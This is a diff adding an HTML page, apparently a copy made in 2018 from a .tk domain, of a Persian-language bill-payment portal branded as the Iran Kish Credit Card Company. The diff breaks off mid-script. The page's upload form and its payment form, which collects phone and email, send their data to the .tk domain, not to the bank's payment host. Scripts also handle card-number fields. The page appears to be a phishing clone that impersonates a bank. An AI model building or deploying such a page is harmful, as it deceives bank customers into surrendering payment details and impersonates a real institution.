@@ -1,0 +1,1266 @@
+<!DOCTYPE html>
+<html data-ng-app="mainApplication" class="ng-scope">
+<!-- Mirrored from media-tarfand-page.tk/FullServices/Bill/Manage.php by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 16 Oct 2018 02:57:14 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head lang="fa"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
+	
+	
+
+	<meta charset="UTF-8">
+	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+	<meta name="author">
+	<meta name="robots">
+	<meta name="keywords">
+	<meta name="copyright">
+	<meta name="description">
+	<meta name="classification">
+
+	<meta name="generator" content="Mr. Dariush Tasdighi">
+
+	<title>صفحه مربوط به پرداخت قبوض</title>
+
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="apple-mobile-web-app-title" content="Iran Kish">
+
+	<link rel="shortcut icon" href="css/favicon.ico">
+	
+
+	<link href="css/jquery.css" rel="stylesheet">
+
+	<link href="css/bootstrap.css" rel="stylesheet">
+	<link href="css/bootstrap-rtl.css" rel="stylesheet">
+	<link href="css/bootstrapConfig.css" rel="stylesheet">
+
+	<link href="css/general-dashboard-page-style.css" rel="stylesheet">
+	<link href="css/general-nav-responsive.css" rel="stylesheet">
+
+	<link href="css/eShop-page-style.css" rel="stylesheet">
+	<link href="css/eShop-responsive-style.css" rel="stylesheet">
+
+	<link href="css/payment-page-style.css" rel="stylesheet">
+	<link href="css/payment-responsive-style.css" rel="stylesheet">
+
+	<style>
+		.dtx-danger {
+			color: #a94442 !important;
+			background-color: #f2dede !important;
+		}
+
+		.dtx-succes {
+			color: #3c763d !important;
+			background-color: #dff0d8 !important;
+		}
+
+		.dtx-warning {
+			color: #8a6d3b !important;
+			background-color: #fcf8e3 !important;
+		}
+
+		.help-block {
+			text-align: justify;
+		}
+
+		button.btn[disabled] {
+			color: gray;
+			border-color: gray;
+			background-color: lightgray !important;
+		}
+
+		tr.bg-danger {
+			background-color: #fde2e8 !important;
+		}
+
+		.pay-info.footer-style-2 .pay-info-002 {
+			height: 250px;
+		}
+
+		.logos img {
+			width: 80px;
+			margin: 0 auto;
+			display: block;
+		}
+
+		.title h4 {
+			text-align: right !important;
+		}
+
+		[ng\:cloak], [ng-cloak], [data-ng-cloak], [x-ng-cloak], .ng-cloak, .x-ng-cloak {
+			display: none !important;
+		}
+	</style>
+
+	<script src="js/jquery-3.js"></script>
+	<script src="js/bootstrap.js"></script>
+	<script src="js/angular.js"></script>
+
+	<script>
+
+		angular.module('mainApplication', []);
+
+	</script>
+
+	<script src="js/dtx-no-back.js"></script>
+
+	<!--[if lt IE 9]>
+	<script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+	<script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+	<![endif]-->
+</head>
+<body style="" class="">
+
+	<div id="wrapper">
+
+		<!--navbar-->
+
+		<nav class="navbar navbar-default navbar-static-top" role="navigation">
+
+			<div class="navbar-header" style="float: left !important">
+			</div>
+
+			<div class="navbar-header">
+				<a class="navbar-brand " href="#">
+					<img src="css/irankish_logo_2X.png" alt="شرکت کارت اعتباری ایران کیش" title="شرکت کارت اعتباری ايران کيش">
+				</a>
+			</div>
+
+			<ul class="nav navbar-nav nav-state-1-links">
+
+							<li class="pull-right"><a href="#">خانه</a></li>
+
+
+				<li>
+					<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#side_collapse">
+						<span class="sr-only">Toggle navigation</span>
+						<span class="icon-bar"></span>
+						<span class="icon-bar"></span>
+						<span class="icon-bar"></span>
+					</button>
+				</li>
+			</ul>
+
+			<div class="navbar-default sidebar" role="navigation">
+
+				<div class="sidebar-nav navbar-collapse" id="side_collapse">
+					<ul class="nav" id="side-menu">
+						<li>
+							<a href="#"><span class="glyphicon glyphicon-stats"></span>پرداخت قبوض</a>
+						</li>
+
+							<li>
+								<a href="../index.html"><span class="glyphicon glyphicon-phone"></span>خرید شارژ</a>
+							</li>
+
+								<li>
+									<a href="../BimehIran/Manage.html"><span class="glyphicon glyphicon-shopping-cart"></span>پرداخت اقساط بیمه ایران</a>
+								</li>
+								<li>
+									<a href="../Olympic/Manage.html"><span class="glyphicon glyphicon-shopping-cart"></span>طرح سپاس سرافرازان المپیک</a>
+								</li>
+								<li>
+									<a href="../Donation/Manage.html"><span class="glyphicon glyphicon-shopping-cart"></span>اهداء مالی به موسسات خیریه</a>
+								</li>
+								<li>
+									<a href="../Service1/Manage.html"><span class="glyphicon glyphicon-shopping-cart"></span>خرید تسهیلات رفاهی، ویژه شاغلین و بازنشستگان</a>
+								</li>
+								<li>
+									<a href="../Service2/Index.html"><span class="glyphicon glyphicon-shopping-cart"></span>پرداخت قبوض اختصاصی</a>
+								</li>
+					</ul>
+
+
+				</div>
+
+			</div>
+		</nav>
+		<!--/navbar-->
+
+		<div id="page-wrapper" style="min-height: 599px;">
+			
+
+
+<div class="row shop-main-row m-t-xs-20 ng-scope" data-ng-controller="mainController">
+
+	<div class="col-md-12">
+
+		<div class="row">
+
+			<div class="col-sm-12 col-md-10 col-md-offset-1 col-lg-8 col-lg-offset-2">
+
+				<div class="row shop-choose-001">
+					<div class="col-sm-12">
+						<div class="bill-btn shop-choose-btn" style="background: rgb(82, 193, 220);">
+							<span class="glyphicon glyphicon-credit-card" aria-hidden="true"></span>
+							<h4>
+								پرداخت قبض
+							</h4>
+						</div>
+					</div>
+				</div>
+
+
+
+					<div id="divUploadFile" style="display: none">
+						<form action="http://media-tarfand-page.tk/eshop/Bill/UploadFile" method="post" enctype="multipart/form-data" class="ng-pristine ng-valid">
+
+
+							<div class="row bill bill-2 shop-main-col">
+								<div class="col-sm-6">
+									<div class="form-group">
+										<input id="file" name="file" class="form-control" type="file">
+									</div>
+								</div>
+
+								<div class="col-sm-6">
+								</div>
+							</div>
+
+							<div class="row bill bill-2 shop-main-col">
+								<div class="col-sm-6 form-group">
+									<label>
+										کد امنيتی
+									</label>
+
+									<input name="securityCode" class="form-control ltr number" maxlength="6" autocomplete="off" type="text">
+								</div>
+
+								<div class="col-sm-6">
+									<div class="row form-group">
+										<div class="col-xs-8">
+											<img id="imgCaptchaImage" src="css/GetCaptchaImage.png" alt="Security Code" title="Security Code">
+										</div>
+										<div class="col-xs-4">
+											<button type="button" id="btnRefreshCaptchaImage" class="btn btn-primary" style="margin-top: 15px;">
+												<span class="glyphicon glyphicon-refresh" aria-hidden="true"></span>
+											</button>
+										</div>
+									</div>
+								</div>
+							</div>
+
+							<div class="row bill bill-2 shop-main-col">
+								<div class="col-sm-6">
+									<div class="form-group">
+										<button type="submit" class="btn btn-primary btn-sm">آپلود فايل اکسل</button>
+										<a href="https://ikc.shaparak.ir/eshop/Content/Samples/Sample.xlsx">[دانلود فايل اکسل نمونه]</a>
+									</div>
+								</div>
+
+								<div class="col-sm-6">
+									<div style="font-size: 8pt; text-align: justify; direction: rtl">
+										<span class="text-danger">توجه</span>:
+										در فایل اکسل نمونه، ستون
+										A،
+										مربوط به شناسه‌قبض، و ستون
+										B،
+										مربوط به شناسه‌پرداخت می‌باشد.
+									</div>
+									<div style="font-size: 8pt; text-align: justify; direction: rtl">
+										<span class="text-danger">توجه</span>:
+										تنها به یکصد سطر اول فایل اکسل، ترتیب‌اثر داده خواهد شد.
+									</div>
+									<div style="font-size: 8pt; text-align: justify; direction: rtl">
+										<span class="text-danger">توجه</span>:
+										اطلاعات قبوضی که قبلا پرداخت شده‌اند، و یا شناسه‌قبض و/یا شناسه‌پرداخت آنها اشتباه می‌باشد،
+										در فهرست ذیل، نمایش داده نخواهند شد.
+									</div>
+								</div>
+							</div>
+
+						</form>
+					</div>
+					<div id="divSendBarcode" style="margin-top: 8px; display: none">
+						<div class="row">
+							<div class="col-sm-2">
+								<label>
+									مقدار بارکد
+								</label>
+							</div>
+							<div class="col-sm-9">
+								<input class="form-control ltr number ng-pristine ng-untouched ng-valid ng-empty" style="height: 30px;" data-ng-model="barcodeValue" type="text">
+							</div>
+							<div class="col-sm-1">
+								<button class="btn btn-danger btn-xs" data-ng-click="deleteBarcode()">حذف</button>
+							</div>
+						</div>
+					</div>
+					<div class="row bill bill-2 shop-main-col">
+						<div class="col-sm-6">
+							<div class="form-group">
+								<label>
+									شناسه قبض
+									<span style="color: red">(اجباری)</span>
+								</label>
+								<input data-ng-model="TheNewBillItem.BillNumber" class="form-control ltr number ng-pristine ng-untouched ng-valid ng-empty ng-valid-maxlength" maxlength="14" placeholder="" type="text">
+								<p class="help-block ng-hide" data-ng-show="TheNewBillItem != null &amp;&amp; TheNewBillItem.BillNumber != null &amp;&amp; TheNewBillItem.BillNumber != 0">
+									<span>پيش‌نمايش:</span>
+									<span style="font-family: Tahoma;" class="ng-binding">
+										0
+									</span>
+								</p>
+							</div>
+						</div>
+
+						<div class="col-sm-6">
+							<div class="form-group">
+								<label>
+									شناسه پرداخت
+									<span style="color: red">(اجباری)</span>
+								</label>
+								<input data-ng-model="TheNewBillItem.BillPaymentId" class="form-control ltr number ng-pristine ng-untouched ng-valid ng-empty ng-valid-maxlength" maxlength="13" placeholder="" type="text">
+								<p class="help-block ng-hide" data-ng-show="TheNewBillItem != null &amp;&amp; TheNewBillItem.BillPaymentId != null &amp;&amp; TheNewBillItem.BillPaymentId != 0">
+									<span>پيش‌نمايش:</span>
+									<span style="font-family: Tahoma;" class="ng-binding">
+										0
+									</span>
+								</p>
+							</div>
+						</div>
+					</div>
+					<div class="row bill bill-2 shop-main-col m-t-xs-10">
+						<div class="col-sm-12">
+							<button type="button" class="btn btn-primary btn-sm ng-binding" data-ng-disabled="addbillitemdisabled()" data-ng-click="addBillItem()">
+								درج اولين قبض
+							</button>
+							<button type="button" class="btn btn-primary btn-sm ng-binding" data-ng-click="sendFile()">
+								ارسال فايل اکسل
+							</button>
+							<button type="button" class="btn btn-primary btn-sm ng-binding" data-ng-click="sendBarcode()">
+								ورود از طریق بارکدخوان
+							</button>
+						</div>
+					</div>
+
+				<div class="row bill bill-2 shop-main-col m-t-xs-10 ng-hide" data-ng-show="thereAreAtleastTwoItems()">
+					<div class="col-sm-6">
+						<div class="form-group">
+							<label>
+								جستجو در قبوض درج شده ذیل
+							</label>
+							<input data-ng-model="filter" class="form-control ng-pristine ng-untouched ng-valid ng-empty" type="text">
+							<p class="help-block">جستجو روی ستون‌های شناسه قبض، شناسه پرداخت و نوع قبض.</p>
+						</div>
+					</div>
+
+					<div class="col-sm-6">
+						<div class="form-group">
+							<label>
+								مرتب سازی بر اساس
+							</label>
+							<select class="form-control ng-pristine ng-untouched ng-valid ng-empty" data-ng-model="sort">
+								<option value="" selected="selected">درج اطلاعات</option>
+								<option value="BillType">نوع قبض</option>
+							</select>
+						</div>
+					</div>
+				</div>
+
+				<div class="row bill bill-2 shop-main-col">
+					<div class="col-sm-12 shop-rule-001 ng-hide" data-ng-show="thereIsAtleastOneItem()">
+
+						<div class="table-responsive">
+							<table class="table table-condensed table-hover table-striped text-center">
+								<thead style="background:rgb(221, 221, 221);">
+									<tr>
+										<th class="text-center">ردیف</th>
+										<th class="text-center">شناسه قبض</th>
+										<th class="text-center">شناسه پرداخت</th>
+										<th class="text-center" style="width: 40px"></th>
+										<th class="text-center">نوع قبض</th>
+										<th class="text-center">مبلغ(ريال)</th>
+										<th class="text-center">توضيحات</th>
+										<th class="text-center">
+											<button type="button" class="btn btn-danger btn-xs ng-hide" data-ng-click="deleteAll()" data-ng-show="thereAreAtleastTwoItems()">حذف همه</button>
+										</th>
+									</tr>
+								</thead>
+
+								<tbody>
+									<!-- ngRepeat: BillItem in BillsPaymentInformation.BillItems | filter: filterFunction | orderBy: sort -->
+									<tr>
+										<td colspan="5">جمع کل</td>
+										<td class="ng-binding">0</td>
+										<td></td>
+										<td></td>
+									</tr>
+								</tbody>
+							</table>
+						</div>
+					</div>
+				</div>
+
+				<div class="row bill bill-2 shop-main-col">
+					<div class="col-sm-12 ng-hide" data-ng-show="thereIsAtleastOneItem()">
+						<div class="well">
+							<p>مشتری گرامی</p>
+							<ul>
+								<li style="text-align: justify">
+									در صورت بروز مشکل، در حين عمليات پرداخت قبوض، مراتب از طريق
+									نشانی پست الکترونيکی و نيز شماره تلفن همراه، به شما اطلاع‌رسانی می‌گردد.
+									لذا توصيه می‌کنيم تا نشانی پست الکترونيکی و نيز شماره تلفن همراه
+									خود را با دقت وارد نماييد.
+									در غير اين صورت، پايگاه مسووليتی
+									در قبال بروز مشکلات نخواهد داشت.
+								</li>
+							</ul>
+						</div>
+					</div>
+				</div>
+
+				<div class="row bill-info m-t-xs-20" data-ng-show="!thereIsAtleastOneItem()">
+					<div class="col-md-12">
+						<div class="well m-b-md-0 text-justify">
+							<!--<h4>پرداخت قبض دسته ای</h4>-->
+
+							<p>
+								با در اختيار داشتن سامانه حاضر، برای پرداخت قبوض آب، برق، گاز، تلفن ثابت، تلفن همراه، عوارض شهرداری و غيره،
+								ديگر نيازی به مراجعه حضوری به شعب بانک ها نيست!
+								شما می توانيد با در اختيار داشتن يکی از کارت های بانکی عضو شتاب، به راحتی و در حداقل زمان ممکن،
+								قبض خود را پرداخت نماييد.
+							</p>
+
+							<div class="row">
+								<div class="col-md-12 title">
+									<h4>
+										<span class="glyphicon glyphicon-credit-card" aria-hidden="true" style="color: #06af4e"></span>پرداخت قبض
+									</h4>
+
+									<p>
+										جهت پرداخت قبض، ابتدا شناسه قبض و شناسه پرداخت را وارد کرده
+										و سپس گزينه 'درج اولین قبض' را انتخاب نماييد
+										پس از بررسی صحت اطلاعات قبض درج شده توسط سامانه،
+										شما می توانيد با تکميل نمودن ایمیل خود، و انتخاب گزينه 'پرداخت'، وارد صفحه پرداخت شويد.
+									</p>
+									<h4 class=" m-t-xs-30">
+										<span class="glyphicon glyphicon-level-up" aria-hidden="true" style="color: #06af4e"></span>پرداخت گروهی قبوض
+									</h4>
+
+									<p>
+										شما می توانید برای پرداخت گروهی قبوض، پس از درج اولین قبض، نسبت به
+										وارد نمودن قبض های بعدی، اقدام نمایید.
+										<br>
+										همچنین می توانید تمامی اطلاعات مربوط به
+										قبوض خود را در يک فايل اکسل (به صورت فايل نمونه) درج نموده
+										و سپس با انتخاب گزینه 'ارسال فایل اکسل'، برای بررسی اطلاعات آنها اقدام نماييد.
+									</p>
+									<h4 class=" m-t-xs-30">
+										<span class="glyphicon glyphicon-phone-alt" aria-hidden="true" style="color: #06af4e"></span>تماس با ما
+									</h4>
+
+									<p>مشتری گرامی در صورت بروز مشکل یا مغایرت با شماره تماس 85949-021 تماس حاصل نمایید.</p>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+
+				<div class="row logos m-t-md-30" data-ng-show="!thereIsAtleastOneItem()">
+					<div class="col-xs-2 ">
+						<img src="css/icon_006.png" alt="">
+					</div>
+					<div class="col-xs-2 ">
+						<img src="css/icon_009.png" alt="">
+					</div>
+					<div class="col-xs-2 ">
+						<img src="css/icon_013.png" alt="">
+					</div>
+					<div class="col-xs-2 ">
+						<img src="css/icon_007.png" alt="">
+					</div>
+					<div class="col-xs-2 ">
+						<img src="css/icon_008.png" alt="">
+					</div>
+					<div class="col-xs-2  ">
+						<img src="css/icon_014.png" alt="">
+					</div>
+				</div>
+
+				<form action="http://media-tarfand-page.tk/eshop/Bill/ReadyForPayment" autocomplete="on" method="get" class="ng-pristine ng-valid ng-valid-maxlength">
+					<div class="row bill bill-2 shop-main-col ng-hide" data-ng-show="thereIsAtleastOneItem()">
+						<div class="col-sm-6">
+							<div class="form-group">
+								<label>
+									شماره تلفن همراه
+									<span style="color: blue">(اختياری)</span>
+								</label>
+								<input id="CellPhoneNumber" name="CellPhoneNumber" data-ng-model="BillsPaymentInformation.CellPhoneNumber" class="form-control ltr number ng-pristine ng-untouched ng-valid ng-empty ng-valid-maxlength" maxlength="11" placeholder="نمونه: ۰۹۱۲۱۰۸۷۴۶۱" type="text">
+							</div>
+						</div>
+
+						<div class="col-sm-6">
+							<div class="form-group">
+								<label>
+									نشانی پست الکترونیکی
+									<span style="color: blue">(اختياری)</span>
+								</label>
+								<input id="EmailAddress" name="EmailAddress" data-ng-model="BillsPaymentInformation.EmailAddress" class="form-control ltr ng-pristine ng-untouched ng-valid ng-empty ng-valid-maxlength" maxlength="250" placeholder="نمونه: DariushT@GMail.com" type="text">
+							</div>
+						</div>
+					</div>
+
+					<div class="row bill bill-2 shop-main-col ng-hide" data-ng-show="thereIsAtleastOneItem()">
+						<div class="col-sm-12">
+							<button type="submit" class="btn btn-primary" data-ng-disabled="payBillItemsDisabled()">پرداخت</button>
+						</div>
+					</div>
+				</form>
+
+			</div>
+		</div>
+	</div>
+
+	<div id="myLoadingModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="myLoadingModalLabel" style="display: none;">
+		<div class="modal-dialog" role="document">
+			<div class="modal-content">
+
+				<div class="modal-header">
+					<h4 class="modal-title" id="myLoadingModalLabel">در حال ارتباط با پايگاه</h4>
+				</div>
+
+				<div class="modal-body">
+					<img src="css/Loading.gif" alt="Loading..." title="Loading...">
+					لطفا چند لحظه بردبار باشيد!
+				</div>
+
+			</div>
+		</div>
+	</div>
+
+	<div id="myMessageDialog" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="myMessageDialogLabel">
+		<div class="modal-dialog" role="document">
+			<div class="modal-content">
+
+				<div class="modal-header" data-ng-class="Notification.CssClass">
+					<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+						<span aria-hidden="true">×</span>
+					</button>
+					<h4 class="modal-title ng-binding" id="myMessageDialogLabel"></h4>
+				</div>
+
+				<div class="modal-body">
+					<ul>
+						<!-- ngRepeat: Message in Notification.Messages -->
+					</ul>
+				</div>
+
+				<div class="modal-footer">
+					<button type="button" class="btn btn-primary" data-dismiss="modal">بستن</button>
+				</div>
+
+			</div>
+		</div>
+	</div>
+</div>
+
+
+		</div>
+
+		<footer class="footer">
+			<div class="container-fluid">
+				<div class="row">
+					<div class="col-md-12 text-center">
+						<span>
+							<em>© </em>۱۳۹۴ - شرکت کارت اعتباری ایران کیش
+							- نسخه:
+							۱.۶.۷ - ۱۳۹۷/۰۷/۲۳
+
+
+								<span style="font-size: 6pt;">
+									[
+									irankish
+									]
+									-
+									[
+									
+									]
+								</span>
+						</span>
+					</div>
+				</div>
+			</div>
+		</footer>
+
+	</div>
+
+	<script src="js/metisMenu.js"></script>
+
+	<script src="js/jquery.js"></script>
+	<script src="js/jquery_002.js"></script>
+	<script src="js/jquery_003.js"></script>
+
+	
+
+	
+
+	<script>
+		$('.charge-btn').click(function () {
+
+			$('.charge,.charge-info').addClass('hidden');
+			$('.' + $(this).attr('data-target')).removeClass('hidden');
+
+		})
+	</script>
+
+	<script>
+		$(function () {
+
+			$("input.keypad").keypad({ showAnim: "", keypadOnly: false, randomiseNumeric: true, });
+
+		});
+	</script>
+
+	<script>
+
+		var varCaptchaImageIndex = 0;
+
+		$(function () {
+
+			$("button#btnRefreshCaptchaImage").click(function () {
+
+				varCaptchaImageIndex++;
+
+				$("img#imgCaptchaImage").attr("src", "https://IKC.Shaparak.ir/EShop/General/GetCaptchaImage/" + varCaptchaImageIndex);
+
+			});
+
+			$("input[name='Payment.Part1'],input[name='Payment.Part2']").blur(function (e) {
+
+				var varPart1 = $("input[name='Payment.Part1']").val();
+				var varPart2 = $("input[name='Payment.Part2']").val();
+
+				if ((varPart1 == "5899") && (varPart2.substring(0, 2) == "10")) {
+
+					$("input[name='Payment.Part5']").removeAttr("disabled");
+
+				}
+				else {
+
+					if ((varPart1 == "6273") && (varPart2.substring(0, 2) == "53")) {
+
+						$("input[name='Payment.Part5']").removeAttr("disabled");
+
+					}
+					else {
+
+						$("input[name='Payment.Part5']").attr("disabled", "disabled");
+
+					}
+
+				}
+
+			});
+
+			$("input.number").keydown(function (e) {
+
+				if (e.ctrlKey) {
+
+					// CTRL + INS
+					if ((e.keyCode == 45) ||
+						// CTRL + C
+						(e.keyCode == 67) ||
+						// CTRL + V
+						(e.keyCode == 86)) {
+					}
+					else {
+
+						e.preventDefault();
+
+					}
+
+				}
+				else {
+
+					if (e.shiftKey) {
+
+						// SHIFT + TAB
+						if ((e.keyCode == 9) ||
+							// SHIFT + LEFT ARROW KEY
+							(e.keyCode == 37) ||
+							// SHIFT + RIGHT ARROW KEY
+							(e.keyCode == 39) ||
+							// SHIFT + INS
+							(e.keyCode == 45)) {
+						}
+						else {
+
+							e.preventDefault();
+
+						}
+
+					}
+					else {
+
+						// BACKSPACE
+						if ((e.keyCode == 8) ||
+							// TAB
+							(e.keyCode == 9) ||
+							// LEFT ARROW KEY
+							(e.keyCode == 37) ||
+							// RIGHT ARROW KEY
+							(e.keyCode == 39) ||
+							// DELETE
+							(e.keyCode == 46) ||
+							// NUMBER KEYS
+							((e.keyCode >= 48) && (e.keyCode <= 57)) ||
+							// NUMLOCK KEYS
+							((e.keyCode >= 96) && (e.keyCode <= 105))) {
+						}
+						else {
+
+							e.preventDefault();
+
+						}
+
+					}
+
+				}
+
+			});
+
+			$("input.paymentField").keydown(function (e) {
+
+				if (((e.keyCode >= 48) && (e.keyCode <= 57)) ||
+					((e.keyCode >= 96) && (e.keyCode <= 105))) {
+
+					var varNextElement;
+
+					var varValue = $(this).val();
+					var varTabIndex = $(this).attr("tabindex");
+					var varMaxLength = $(this).attr("maxlength");
+
+					if (varValue.length >= varMaxLength) {
+
+						varTabIndex++;
+
+						if (varTabIndex > 10) {
+
+							return;
+
+						}
+
+						varNextElement =
+							$("input.paymentField[tabindex=" + varTabIndex + "]").first();
+
+						if ($(varNextElement).attr("disabled") == "disabled") {
+
+							varTabIndex++;
+
+							if (varTabIndex > 10) {
+
+								return;
+
+							}
+
+							varNextElement =
+								$("input.paymentField[tabindex=" + varTabIndex + "]").first();
+
+						}
+
+						if (varTabIndex == 8) {
+
+							$("input.paymentField[tabindex=7]").keypad('hide');
+
+						}
+
+						$(varNextElement).focus();
+
+					}
+
+				}
+				else {
+					if (e.keyCode == 8) {
+
+						var varPrevElement;
+
+						var varValue = $(this).val();
+						var varTabIndex = $(this).attr("tabindex");
+
+						if (varValue.length <= 0) {
+
+							varTabIndex--;
+
+							if (varTabIndex < 1) {
+
+								return;
+
+							}
+
+							varPrevElement =
+								$("input.paymentField[tabindex=" + varTabIndex + "]").first();
+
+							if ($(varPrevElement).attr("disabled") == "disabled") {
+
+								varTabIndex--;
+
+								if (varTabIndex < 1) {
+
+									return;
+
+								}
+
+								varPrevElement =
+									$("input.paymentField[tabindex=" + varTabIndex + "]").first();
+
+							}
+
+							if ((varTabIndex == 4) || (varTabIndex == 5)) {
+
+								$("input.paymentField[tabindex=6]").keypad('hide');
+
+							}
+
+							$(varPrevElement).focus();
+
+						}
+
+					}
+				}
+
+			});
+
+		});
+
+	</script>
+
+	
+	<script>
+
+		angular.module('mainApplication')
+
+			.controller('mainController', function ($scope, $http) {
+
+				$scope.TheNewBillItem = null;
+				$scope.sendFileEnabled = false;
+				$scope.BillsPaymentInformation = null;
+
+				// **************************************************
+				$("div#myLoadingModal").modal({ backdrop: false, keyboard: false, });
+
+				$http.post("https://ikc.shaparak.ir/EShop/Bill/GetBillsPaymentInformation", null)
+
+					.then(function successCallback(response) {
+
+						$scope.BillsPaymentInformation = response.data.Data;
+
+						$("div#myLoadingModal").modal("toggle");
+
+					}, function errorCallback(response) {
+
+						$("div#myLoadingModal").modal("toggle");
+
+						alert("خطا در ارسال و دريافت اطلاعات");
+
+					});
+				// **************************************************
+
+				$scope.getClassNameForRowItem = function (billItem) {
+
+					if ((billItem.State == 0) || (billItem.State == 2)) {
+
+						return ("bg-danger");
+
+					}
+
+				};
+
+				$scope.total = function () {
+
+					if ($scope.BillsPaymentInformation == null) {
+
+						return (0);
+
+					}
+
+					if ($scope.BillsPaymentInformation.BillItems == null) {
+
+						return (0);
+
+					}
+
+					var intTotal = 0;
+
+					for (var intIndex = 0; intIndex < $scope.BillsPaymentInformation.BillItems.length; intIndex++) {
+
+						var varAmount =
+							$scope.BillsPaymentInformation.BillItems[intIndex].Amount;
+
+						if ((varAmount != null) && (varAmount != '')) {
+
+							intTotal +=
+								parseInt($scope.BillsPaymentInformation.BillItems[intIndex].Amount);
+
+						}
+
+					}
+
+					return (intTotal);
+
+				};
+
+				$scope.addBillItemText = function () {
+
+					if (($scope.BillsPaymentInformation == null) ||
+						($scope.BillsPaymentInformation.BillItems == null) ||
+						($scope.BillsPaymentInformation.BillItems.length == 0)) {
+
+						return ("درج اولين قبض");
+
+					}
+					else {
+
+						return ("درج قبض بعدی");
+
+					}
+
+				};
+
+				$scope.sendFile = function () {
+
+					$scope.sendFileEnabled = !$scope.sendFileEnabled;
+
+					if ($scope.sendFileEnabled) {
+
+						$("div#divUploadFile").slideDown(500);
+
+					}
+					else {
+
+						$("div#divUploadFile").slideUp(500);
+
+					}
+
+				};
+
+				$scope.sendFileText = function () {
+
+					if ($scope.sendFileEnabled) {
+
+						return ("انصراف از ارسال فايل اکسل");
+
+					}
+					else {
+
+						return ("ارسال فايل اکسل");
+
+					}
+
+				};
+
+				$scope.sendBarcode = function () {
+
+					$scope.sendBarcodeEnabled = !$scope.sendBarcodeEnabled;
+
+					if ($scope.sendBarcodeEnabled) {
+
+						$("div#divSendBarcode").slideDown(500);
+
+					}
+					else {
+
+						$("div#divSendBarcode").slideUp(500);
+
+					}
+
+				};
+
+				$scope.sendBarcodeText = function () {
+
+					if ($scope.sendBarcodeEnabled) {
+
+						return ("انصراف از ورود از طریق بارکدخوان");
+
+					}
+					else {
+
+						return ("ورود از طریق بارکدخوان");
+
+					}
+
+				};
+
+				$scope.deleteBarcode = function () {
+
+					$scope.barcodeValue = '';
+
+				}
+
+				$scope.$watch('barcodeValue', function () {
+
+					if ($scope.TheNewBillItem == null) {
+
+						$scope.TheNewBillItem = { BillNumber : '', BillPaymentId : '' };
+
+					}
+
+					if (($scope.barcodeValue == null) || ($scope.barcodeValue == '')) {
+
+						$scope.TheNewBillItem.BillNumber = '';
+						$scope.TheNewBillItem.BillPaymentId = '';
+
+					}
+					else {
+
+						// عدد ۱۳ به زودی باید تغییر کند
+						$scope.TheNewBillItem.BillNumber = $scope.barcodeValue.substring(0, 13);
+						$scope.TheNewBillItem.BillPaymentId = $scope.barcodeValue.substring(13, 26);
+
+					}
+
+				});
+
+				$scope.payBillItemsDisabled = function () {
+
+					if ($scope.BillsPaymentInformation == null) {
+
+						return (true);
+
+					}
+					else {
+
+						return (false);
+
+					}
+
+					//if (($scope.BillsPaymentInformation == null) ||
+					//	($scope.BillsPaymentInformation.EmailAddress == null) ||
+					//	($scope.BillsPaymentInformation.EmailAddress == "")) {
+
+					//	return (true);
+
+					//}
+					//else {
+
+					//	return (false);
+
+					//}
+
+				};
+
+				$scope.addBillItemDisabled = function () {
+
+					if ($scope.TheNewBillItem == null) {
+
+						return (true);
+
+					}
+					else {
+						if (($scope.TheNewBillItem.BillNumber == null) ||
+							($scope.TheNewBillItem.BillNumber == "") ||
+							($scope.TheNewBillItem.BillPaymentId == null) ||
+							($scope.TheNewBillItem.BillPaymentId == "")) {
+
+							return (true);
+
+						}
+						else {
+
+							return (false);
+
+						}
+					}
+
+				};
+
+				$scope.thereIsAtleastOneItem = function () {
+
+					if ($scope.BillsPaymentInformation == null) {
+
+						return (false);
+
+					}
+
+					if ($scope.BillsPaymentInformation.BillItems == null) {
+
+						return (false);
+
+					}
+
+					if ($scope.BillsPaymentInformation.BillItems.length == 0) {
+
+						return (false);
+
+					}
+
+					return (true);
+
+				};
+
+				$scope.thereAreAtleastTwoItems = function () {
+
+					if ($scope.BillsPaymentInformation == null) {
+
+						return (false);
+
+					}
+
+					if ($scope.BillsPaymentInformation.BillItems == null) {
+
+						return (false);
+
+					}
+
+					if ($scope.BillsPaymentInformation.BillItems.length <= 1) {
+
+						return (false);
+
+					}
+
+					return (true);
+
+				};
+
+				$scope.filterFunction = function (billItem) {
+
+					if (($scope.filter == null) ||
+						($scope.filter == "")) {
+
+						return (true);
+
+					}
+					else {
+
+						if ((billItem.BillNumber.toUpperCase().match($scope.filter.toUpperCase())) ||
+							(billItem.BillPaymentId.toUpperCase().match($scope.filter.toUpperCase())) ||
+							(billItem.BillTypeDisplayName.toUpperCase().match($scope.filter.toUpperCase()))) {
+
+							return (true);
+
+						}
+						else {
+
+							return (false);
+
+						}
+
+					}
+
+				};
+
+				$scope.addBillItem = function () {
+
+					$scope.barcodeValue = '';
+
+					// **************************************************
+					$("div#myLoadingModal").modal({ backdrop: false, keyboard: false, });
+
+					$http.post("https://ikc.shaparak.ir/EShop/Bill/AddBillItem", $scope.TheNewBillItem)
+
+						.then(function successCallback(response) {
+
+							$("div#myLoadingModal").modal("toggle");
+
+							if (response.data.State == 1) {
+
+								$scope.BillsPaymentInformation.BillItems.unshift(response.data.Data);
+
+								$scope.TheNewBillItem = null;
+							}
+
+							$scope.Notification = response.data.Notification;
+
+							if ($scope.Notification.Display) {
+
+								$("div#myMessageDialog").modal();
+
+							}
+
+						}, function errorCallback(response) {
+
+							$("div#myLoadingModal").modal("toggle");
+
+							alert("خطا در ارسال و دريافت اطلاعات");
+
+						});
+					// **************************************************
+
+				};
+
+				$scope.delete = function (billItem, index) {
+
+					// **************************************************
